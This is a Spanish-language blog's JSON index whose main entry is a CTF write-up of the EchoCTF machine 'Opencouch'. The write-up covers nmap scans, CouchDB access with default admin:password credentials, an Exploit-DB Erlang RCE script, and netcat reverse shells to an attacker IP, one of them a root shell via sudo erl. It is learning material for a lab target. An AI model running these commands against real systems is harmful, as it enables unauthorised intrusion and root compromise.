[{"content":"","date":"8 February 2023","permalink":"/","section":"B1otme","summary":"","title":"B1otme"},{"content":"Aqui estare poniendo Writeups de las maquinas que ire resolviendo de las paginas Hackthebox, EchoCTF, Tryhackme, etc.\n","date":"8 February 2023","permalink":"/machines/","section":"Machines","summary":"Aqui estare poniendo Writeups de las maquinas que ire resolviendo de las paginas Hackthebox, EchoCTF, Tryhackme, etc.","title":"Machines"},{"content":"IP: 10.0.160.39\nPort: 80,4369,5984,9100\nAnalisis Nmap\u003e\rAnalisis Nmap # # Nmap 7.93 scan initiated Wed Feb 1 21:54:46 2023 as: nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG allPorts 10.0.160.39 # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;) Host: 10.0.160.39 () Status: Up Host: 10.0.160.39 () Ports: 80/open/tcp//http///, 4369/open/tcp//epmd///, 5984/open/tcp//couchdb///, 9100/open/tcp//jetdirect/// # Nmap done at Wed Feb 1 21:55:25 2023 -- 1 IP address (1 host up) scanned in 39.87 seconds Analisis de puertos especificos\u003e\rAnalisis de puertos especificos # # Nmap 7.93 scan initiated Wed Feb 1 20:20:35 2023 as: nmap -sCV -Pn -p80,4369,5984,9100 -oN targeted 10.0.160.39 Nmap scan report for 10.0.160.39 Host is up (0.15s latency). PORT STATE SERVICE VERSION 80/tcp open http nginx 1.18.0 |_http-title: OpenNote |_http-server-header: nginx/1.18.0 4369/tcp open epmd Erlang Port Mapper Daemon | epmd-info: | epmd_port: 4369 | nodes: |_ couchdb: 9100 5984/tcp open http CouchDB httpd 3.2.1 (Erlang OTP/20) |_http-server-header: CouchDB/3.2.1 (Erlang OTP/20) |_http-title: Site doesn\u0026#39;t have a title (application/json). 9100/tcp open jetdirect? Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Feb 1 20:20:52 2023 -- 1 IP address (1 host up) scanned in 17.41 seconds Explotación\u003e\rExplotación # Encontramos una bandera en http://admin:password@10.0.160.39:5984/_all_dbs Esto se puede hacer dentro de la maquina con:\ncurl http://admin:password@localhost:5984/_all_dbs Explotacion Podemos utilizar el siguiente exploit para obtener la reverse shell https://www.exploit-db.com/exploits/50914\n-$ python 50914.py Remote Command Execution via Erlang Distribution Protocol. Found name couchdb at port 9100 Authentication successful Enter command: \u0026gt; nc -c bash 10.10.0.54 1234 Dentro de la maquina utilizamos nos dan Sudoers de erl y podemos utilizarlo para escalar de privilegios https://book.hacktricks.xyz/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd\ncouchdb@opencouch:/$ sudo /usr/bin/erl h Y nos enviamos una reverse shell con root\ncouchdb@opencouch:/$ sudo /usr/bin/erl h Erlang/OTP 23 [erts-11.1.8] [source] [64-bit] [smp:2:2] [ds:2:2:10] [async-threads:1] Eshell V11.1.8 (abort with ^G) 1\u0026gt; os:cmd(\u0026#39;nc -c 10.10.0.54 443\u0026#39;). Pwned ","date":"8 February 2023","permalink":"/machines/opencouch/","section":"Machines","summary":"IP: 10.","title":"Opencouch"},{"content":"","date":"8 February 2023","permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":"8 February 2023","permalink":"/posts/someinfo/","section":"Posts","summary":"","title":"Someinfo"},{"content":"Presentación\u003e\rPresentación # Hola, esta pagina sera para subir mis proyectos, lo que vaya aprendiendo y alguna que otra cosa extra.\n","date":"8 February 2023","permalink":"/posts/intro/","section":"Posts","summary":"Presentación\u003e\rPresentación # Hola, esta pagina sera para subir mis proyectos, lo que vaya aprendiendo y alguna que otra cosa extra.","title":"Intro"},{"content":"","date":"1 January 0001","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"1 January 0001","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"1 January 0001","permalink":"/series/","section":"Series","summary":"","title":"Series"},{"content":"","date":"1 January 0001","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"}]